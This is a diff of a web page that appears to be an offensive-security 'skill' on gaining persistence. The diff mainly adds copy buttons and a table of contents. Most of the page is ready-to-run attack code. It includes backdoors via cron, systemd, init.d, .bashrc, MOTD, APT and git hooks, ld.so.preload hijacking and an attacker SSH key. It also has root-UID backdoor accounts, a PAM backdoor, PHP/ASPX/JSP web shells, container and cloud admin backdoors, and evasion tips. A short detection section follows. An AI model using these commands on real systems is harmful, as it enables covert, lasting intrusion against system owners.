@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Establish persistence on Windows and Linux systems using registry keys, scheduled tasks, services, cron jobs, SSH keys, backdoor accounts, and rootkits. Use when performing post-exploitation or maintaining long-term access.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><h2>When to Use</h2>
+<div class="wrap slayout"><article><h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>Maintaining access to compromised systems</li>
 <li>Post-exploitation techniques</li>
@@ -47,7 +59,7 @@
 <li>Persistence testing</li>
 <li>Backdoor creation</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Before you have access</strong> — use the relevant initial access or privilege</li>
 </ul>
@@ -57,11 +69,25 @@
 <li><strong>Finding an attacker's persistence as a defender</strong> — use</li>
 </ul>
 <p><a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a> and <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></p>
-<h2>Windows Persistence</h2>
+<h2 id="windows-persistence">Windows Persistence</h2>
 <p>The exhaustive Windows command catalog — registry Run keys, scheduled tasks, services, WMI event subscriptions, startup folder, DLL hijacking, IFEO, AppInit_DLLs, and backdoor accounts — lives in <a href="references/windows-persistence-commands.md">references/windows-persistence-commands.md</a>.</p>
-<h2>Linux Persistence</h2>
+<h2 id="linux-persistence">Linux Persistence</h2>
 <h3>Cron Jobs</h3>
-<pre><code># User crontab (no sudo needed)
+<div class="codeblk cx"><button class="copy" data-copy="# User crontab (no sudo needed)
+crontab -e
+# Add:
+@reboot /tmp/.backdoor
+0 * * * * /tmp/.backdoor  # Every hour
+
+# System-wide cron (requires root)
+echo &quot;@reboot root /tmp/.backdoor&quot; &gt;&gt; /etc/crontab
+
+# Cron.d directory
+echo &quot;* * * * * root /tmp/.backdoor&quot; &gt; /etc/cron.d/backdoor
+
+# Daily/hourly cron scripts
+cp backdoor.sh /etc/cron.daily/update
+chmod +x /etc/cron.daily/update">copy</button><pre><code># User crontab (no sudo needed)
 crontab -e
 # Add:
 @reboot /tmp/.backdoor
@@ -75,9 +101,9 @@ echo "* * * * * root /tmp/.backdoor" &gt; /etc/cron.d/backdoor
 
 # Daily/hourly cron scripts
 cp backdoor.sh /etc/cron.daily/update
-chmod +x /etc/cron.daily/update</code></pre>
+chmod +x /etc/cron.daily/update</code></pre></div>
 <h3>Systemd Services</h3>
-<pre><code># Create service file
+<div class="codeblk cx"><button class="copy" data-copy="# Create service file
 cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; EOF
 [Unit]
 Description=System Update Service
@@ -98,9 +124,30 @@ systemctl enable backdoor.service
 systemctl start backdoor.service
 
 # Verify
-systemctl status backdoor.service</code></pre>
+systemctl status backdoor.service">copy</button><pre><code># Create service file
+cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; EOF
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/.backdoor
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Enable and start
+systemctl daemon-reload
+systemctl enable backdoor.service
+systemctl start backdoor.service
+
+# Verify
+systemctl status backdoor.service</code></pre></div>
 <h3>RC Scripts (Init.d)</h3>
-<pre><code># Create init script
+<div class="codeblk cx"><button class="copy" data-copy="# Create init script
 cat &gt; /etc/init.d/backdoor &lt;&lt; EOF
 #!/bin/bash
 ### BEGIN INIT INFO
@@ -114,60 +161,118 @@ cat &gt; /etc/init.d/backdoor &lt;&lt; EOF
 EOF
 
 chmod +x /etc/init.d/backdoor
-update-rc.d backdoor defaults</code></pre>
+update-rc.d backdoor defaults">copy</button><pre><code># Create init script
+cat &gt; /etc/init.d/backdoor &lt;&lt; EOF
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides: backdoor
+# Required-Start: \$network
+# Required-Stop:
+# Default-Start: 2 3 4 5
+# Default-Stop: 0 1 6
+### END INIT INFO
+/tmp/.backdoor &amp;
+EOF
+
+chmod +x /etc/init.d/backdoor
+update-rc.d backdoor defaults</code></pre></div>
 <h3>SSH Keys</h3>
-<pre><code># Add attacker's public key
+<div class="codeblk cx"><button class="copy" data-copy="# Add attacker&#x27;s public key
+mkdir -p /root/.ssh
+echo &quot;ssh-rsa AAAA...attacker_key&quot; &gt;&gt; /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+# For specific user
+echo &quot;ssh-rsa AAAA...attacker_key&quot; &gt;&gt; /home/user/.ssh/authorized_keys">copy</button><pre><code># Add attacker's public key
 mkdir -p /root/.ssh
 echo "ssh-rsa AAAA...attacker_key" &gt;&gt; /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 
 # For specific user
-echo "ssh-rsa AAAA...attacker_key" &gt;&gt; /home/user/.ssh/authorized_keys</code></pre>
+echo "ssh-rsa AAAA...attacker_key" &gt;&gt; /home/user/.ssh/authorized_keys</code></pre></div>
 <h3>.bashrc / .bash_profile</h3>
-<pre><code># Add to user's .bashrc
+<div class="codeblk cx"><button class="copy" data-copy="# Add to user&#x27;s .bashrc
+echo &quot;/tmp/.backdoor &amp;&quot; &gt;&gt; ~/.bashrc
+echo &quot;/tmp/.backdoor &amp;&quot; &gt;&gt; ~/.bash_profile
+
+# Root .bashrc
+echo &quot;/tmp/.backdoor &amp;&quot; &gt;&gt; /root/.bashrc">copy</button><pre><code># Add to user's .bashrc
 echo "/tmp/.backdoor &amp;" &gt;&gt; ~/.bashrc
 echo "/tmp/.backdoor &amp;" &gt;&gt; ~/.bash_profile
 
 # Root .bashrc
-echo "/tmp/.backdoor &amp;" &gt;&gt; /root/.bashrc</code></pre>
+echo "/tmp/.backdoor &amp;" &gt;&gt; /root/.bashrc</code></pre></div>
 <h3>LD_PRELOAD</h3>
-<pre><code># Hijack library loading
+<div class="codeblk cx"><button class="copy" data-copy="# Hijack library loading
+echo &quot;/tmp/evil.so&quot; &gt; /etc/ld.so.preload
+
+# Will load evil.so into every process">copy</button><pre><code># Hijack library loading
 echo "/tmp/evil.so" &gt; /etc/ld.so.preload
 
-# Will load evil.so into every process</code></pre>
+# Will load evil.so into every process</code></pre></div>
 <h3>MOTD Backdoor</h3>
-<pre><code># Add to message of the day scripts (runs on SSH login)
+<div class="codeblk cx"><button class="copy" data-copy="# Add to message of the day scripts (runs on SSH login)
+echo &quot;/tmp/.backdoor &amp;&quot; &gt;&gt; /etc/update-motd.d/00-header
+chmod +x /etc/update-motd.d/00-header">copy</button><pre><code># Add to message of the day scripts (runs on SSH login)
 echo "/tmp/.backdoor &amp;" &gt;&gt; /etc/update-motd.d/00-header
-chmod +x /etc/update-motd.d/00-header</code></pre>
+chmod +x /etc/update-motd.d/00-header</code></pre></div>
 <h3>APT/Package Manager</h3>
-<pre><code># APT hook (Debian/Ubuntu)
+<div class="codeblk cx"><button class="copy" data-copy="# APT hook (Debian/Ubuntu)
+cat &gt; /etc/apt/apt.conf.d/99backdoor &lt;&lt; EOF
+APT::Update::Pre-Invoke {&quot;/tmp/.backdoor &amp;&quot;;};
+EOF
+
+# Runs before apt update">copy</button><pre><code># APT hook (Debian/Ubuntu)
 cat &gt; /etc/apt/apt.conf.d/99backdoor &lt;&lt; EOF
 APT::Update::Pre-Invoke {"/tmp/.backdoor &amp;";};
 EOF
 
-# Runs before apt update</code></pre>
+# Runs before apt update</code></pre></div>
 <h3>Git Hooks</h3>
-<pre><code># If git repositories exist
+<div class="codeblk cx"><button class="copy" data-copy="# If git repositories exist
+echo &quot;/tmp/.backdoor &amp;&quot; &gt; /path/to/repo/.git/hooks/post-checkout
+chmod +x /path/to/repo/.git/hooks/post-checkout
+
+# Triggers on git checkout">copy</button><pre><code># If git repositories exist
 echo "/tmp/.backdoor &amp;" &gt; /path/to/repo/.git/hooks/post-checkout
 chmod +x /path/to/repo/.git/hooks/post-checkout
 
-# Triggers on git checkout</code></pre>
+# Triggers on git checkout</code></pre></div>
 <h3>Backdoor Accounts</h3>
-<pre><code># Create backdoor user with root UID
+<div class="codeblk cx"><button class="copy" data-copy="# Create backdoor user with root UID
+useradd -u 0 -o -g 0 -M -d /root -s /bin/bash backdoor
+echo &quot;backdoor:P@ssw0rd&quot; | chpasswd
+
+# Or add to /etc/passwd directly
+echo &quot;backdoor:x:0:0::/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+echo &quot;backdoor:$(openssl passwd -6 P@ssw0rd):::::::&quot; &gt;&gt; /etc/shadow">copy</button><pre><code># Create backdoor user with root UID
 useradd -u 0 -o -g 0 -M -d /root -s /bin/bash backdoor
 echo "backdoor:P@ssw0rd" | chpasswd
 
 # Or add to /etc/passwd directly
 echo "backdoor:x:0:0::/root:/bin/bash" &gt;&gt; /etc/passwd
-echo "backdoor:$(openssl passwd -6 P@ssw0rd):::::::" &gt;&gt; /etc/shadow</code></pre>
+echo "backdoor:$(openssl passwd -6 P@ssw0rd):::::::" &gt;&gt; /etc/shadow</code></pre></div>
 <h3>PAM Backdoor</h3>
-<pre><code># Add to /etc/pam.d/sshd or /etc/pam.d/common-auth
+<div class="codeblk cx"><button class="copy" data-copy="# Add to /etc/pam.d/sshd or /etc/pam.d/common-auth
 # Use custom PAM module that accepts magic password
 auth sufficient pam_unix.so try_first_pass
-auth sufficient /lib/security/pam_backdoor.so</code></pre>
-<h2>Web Shells</h2>
+auth sufficient /lib/security/pam_backdoor.so">copy</button><pre><code># Add to /etc/pam.d/sshd or /etc/pam.d/common-auth
+# Use custom PAM module that accepts magic password
+auth sufficient pam_unix.so try_first_pass
+auth sufficient /lib/security/pam_backdoor.so</code></pre></div>
+<h2 id="web-shells">Web Shells</h2>
 <h3>PHP Web Shell</h3>
-<pre><code>&lt;?php
+<div class="codeblk cx"><button class="copy" data-copy="&lt;?php
+// simple.php
+system($_GET[&#x27;cmd&#x27;]);
+?&gt;
+
+// Advanced
+&lt;?php
+if($_GET[&#x27;key&#x27;] == &#x27;secret&#x27;) {
+    eval($_POST[&#x27;cmd&#x27;]);
+}
+?&gt;">copy</button><pre><code>&lt;?php
 // simple.php
 system($_GET['cmd']);
 ?&gt;
@@ -177,9 +282,9 @@ system($_GET['cmd']);
 if($_GET['key'] == 'secret') {
     eval($_POST['cmd']);
 }
-?&gt;</code></pre>
+?&gt;</code></pre></div>
 <p><strong>Upload Locations:</strong></p>
-<pre><code># Web roots
+<div class="codeblk cx"><button class="copy" data-copy="# Web roots
 /var/www/html/
 /var/www/
 /usr/share/nginx/html/
@@ -188,28 +293,49 @@ C:\inetpub\wwwroot\
 # Hidden names
 .htaccess.php
 favicon.ico.php
-robots.txt.php</code></pre>
+robots.txt.php">copy</button><pre><code># Web roots
+/var/www/html/
+/var/www/
+/usr/share/nginx/html/
+C:\inetpub\wwwroot\
+
+# Hidden names
+.htaccess.php
+favicon.ico.php
+robots.txt.php</code></pre></div>
 <h3>ASP/ASPX Web Shell</h3>
-<pre><code>&lt;%@ Page Language="C#" %&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;%@ Page Language=&quot;C#&quot; %&gt;
+&lt;%
+Response.Write(System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c &quot; + Request[&quot;cmd&quot;]).StandardOutput.ReadToEnd());
+%&gt;">copy</button><pre><code>&lt;%@ Page Language="C#" %&gt;
 &lt;%
 Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
-%&gt;</code></pre>
+%&gt;</code></pre></div>
 <h3>JSP Web Shell</h3>
-<pre><code>&lt;%
+<div class="codeblk cx"><button class="copy" data-copy="&lt;%
+Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+%&gt;">copy</button><pre><code>&lt;%
 Runtime.getRuntime().exec(request.getParameter("cmd"));
-%&gt;</code></pre>
-<h2>Container Persistence</h2>
+%&gt;</code></pre></div>
+<h2 id="container-persistence">Container Persistence</h2>
 <p><strong>Docker:</strong></p>
-<pre><code># Modify container to restart always
+<div class="codeblk cx"><button class="copy" data-copy="# Modify container to restart always
 docker update --restart=always container_name
 
 # Add to docker-compose.yml
 restart: always
 
 # Create new container with backdoor
-docker run -d --restart=always --name backdoor evil_image</code></pre>
+docker run -d --restart=always --name backdoor evil_image">copy</button><pre><code># Modify container to restart always
+docker update --restart=always container_name
+
+# Add to docker-compose.yml
+restart: always
+
+# Create new container with backdoor
+docker run -d --restart=always --name backdoor evil_image</code></pre></div>
 <p><strong>Kubernetes:</strong></p>
-<pre><code># DaemonSet (runs on all nodes)
+<div class="codeblk cx"><button class="copy" data-copy="# DaemonSet (runs on all nodes)
 apiVersion: apps/v1
 kind: DaemonSet
 metadata:
@@ -225,10 +351,26 @@ spec:
     spec:
       containers:
       - name: backdoor
-        image: attacker/backdoor:latest</code></pre>
-<h2>Cloud Persistence</h2>
+        image: attacker/backdoor:latest">copy</button><pre><code># DaemonSet (runs on all nodes)
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: backdoor
+spec:
+  selector:
+    matchLabels:
+      name: backdoor
+  template:
+    metadata:
+      labels:
+        name: backdoor
+    spec:
+      containers:
+      - name: backdoor
+        image: attacker/backdoor:latest</code></pre></div>
+<h2 id="cloud-persistence">Cloud Persistence</h2>
 <h3>AWS</h3>
-<pre><code># Create IAM user
+<div class="codeblk cx"><button class="copy" data-copy="# Create IAM user
 aws iam create-user --user-name backdoor
 
 # Attach admin policy
@@ -238,17 +380,34 @@ aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:po
 aws iam create-access-key --user-name backdoor
 
 # Lambda function persistence
-# Create Lambda that executes periodically via CloudWatch Events</code></pre>
+# Create Lambda that executes periodically via CloudWatch Events">copy</button><pre><code># Create IAM user
+aws iam create-user --user-name backdoor
+
+# Attach admin policy
+aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Create access key
+aws iam create-access-key --user-name backdoor
+
+# Lambda function persistence
+# Create Lambda that executes periodically via CloudWatch Events</code></pre></div>
 <h3>Azure</h3>
-<pre><code># Create service principal
+<div class="codeblk cx"><button class="copy" data-copy="# Create service principal
+az ad sp create-for-rbac --name &quot;backdoor&quot; --role Contributor
+
+# Create managed identity
+az identity create --name backdoor --resource-group RG
+
+# Function App persistence
+# Deploy Azure Function that runs on schedule">copy</button><pre><code># Create service principal
 az ad sp create-for-rbac --name "backdoor" --role Contributor
 
 # Create managed identity
 az identity create --name backdoor --resource-group RG
 
 # Function App persistence
-# Deploy Azure Function that runs on schedule</code></pre>
-<h2>Rootkits</h2>
+# Deploy Azure Function that runs on schedule</code></pre></div>
+<h2 id="rootkits">Rootkits</h2>
 <p><strong>User-mode Rootkit:</strong></p>
 <ul>
 <li>Hook library functions</li>
@@ -263,12 +422,27 @@ az identity create --name backdoor --resource-group RG
 <li>Harder to detect</li>
 <li>Requires root</li>
 </ul>
-<pre><code># Example LKM (requires kernel headers)
+<div class="codeblk cx"><button class="copy" data-copy="# Example LKM (requires kernel headers)
 # Compile and load malicious kernel module
-insmod backdoor.ko</code></pre>
-<h2>Persistence Detection</h2>
+insmod backdoor.ko">copy</button><pre><code># Example LKM (requires kernel headers)
+# Compile and load malicious kernel module
+insmod backdoor.ko</code></pre></div>
+<h2 id="persistence-detection">Persistence Detection</h2>
 <p><strong>Windows:</strong></p>
-<pre><code># Check Run keys
+<div class="codeblk cx"><button class="copy" data-copy="# Check Run keys
+Get-ItemProperty -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&quot;
+Get-ItemProperty -Path &quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&quot;
+
+# Check scheduled tasks
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike &quot;\Microsoft*&quot;}
+
+# Check services
+Get-Service | Where-Object {$_.StartType -eq &quot;Automatic&quot;}
+
+# Check WMI subscriptions
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter
+Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding">copy</button><pre><code># Check Run keys
 Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 
@@ -281,9 +455,9 @@ Get-Service | Where-Object {$_.StartType -eq "Automatic"}
 # Check WMI subscriptions
 Get-WMIObject -Namespace root\Subscription -Class __EventFilter
 Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
-Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</code></pre>
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</code></pre></div>
 <p><strong>Linux:</strong></p>
-<pre><code># Check cron jobs
+<div class="codeblk cx"><button class="copy" data-copy="# Check cron jobs
 crontab -l
 ls -la /etc/cron.*
 cat /etc/crontab
@@ -302,8 +476,27 @@ cat /root/.ssh/authorized_keys
 cat /etc/ld.so.preload
 
 # Check for hidden files
-find / -name ".*"</code></pre>
-<h2>OpSec Tips</h2>
+find / -name &quot;.*&quot;">copy</button><pre><code># Check cron jobs
+crontab -l
+ls -la /etc/cron.*
+cat /etc/crontab
+
+# Check systemd services
+systemctl list-unit-files --type=service --state=enabled
+
+# Check init scripts
+ls -la /etc/init.d/
+
+# Check SSH authorized_keys
+cat ~/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+
+# Check LD_PRELOAD
+cat /etc/ld.so.preload
+
+# Check for hidden files
+find / -name ".*"</code></pre></div>
+<h2 id="opsec-tips">OpSec Tips</h2>
 <ul>
 <li><strong>Blend in</strong> - Use system-like names (WindowsUpdate, SystemCheck)</li>
 <li><strong>Redundancy</strong> - Establish multiple persistence methods</li>
@@ -311,7 +504,7 @@ find / -name ".*"</code></pre>
 <li><strong>Cleanup</strong> - Remove persistence when engagement ends</li>
 <li><strong>Timestamps</strong> - Match file timestamps to system files</li>
 </ul>
-<h2>Tools</h2>
+<h2 id="tools">Tools</h2>
 <ul>
 <li><strong>PowerSploit</strong> - PowerShell post-exploitation</li>
 <li><strong>Empire</strong> - Post-exploitation framework</li>
@@ -319,7 +512,7 @@ find / -name ".*"</code></pre>
 <li><strong>SILENTTRINITY</strong> - Modern C2 framework</li>
 <li><strong>Covenant</strong> - .NET C2 framework</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Execution</strong> (TA0002)</p>
 <ul>
@@ -346,10 +539,13 @@ find / -name ".*"</code></pre>
 <li><a href="https://attack.mitre.org/techniques/T1036/">T1036</a> Masquerading — see also <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a></li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li>https://attack.mitre.org/tactics/TA0003/</li>
 <li>https://book.hacktricks.xyz/</li>
 <li>https://github.com/PowerShellMafia/PowerSploit</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#windows-persistence">Windows Persistence</a><a href="#linux-persistence">Linux Persistence</a><a href="#web-shells">Web Shells</a><a href="#container-persistence">Container Persistence</a><a href="#cloud-persistence">Cloud Persistence</a><a href="#rootkits">Rootkits</a><a href="#persistence-detection">Persistence Detection</a><a href="#opsec-tips">OpSec Tips</a><a href="#tools">Tools</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
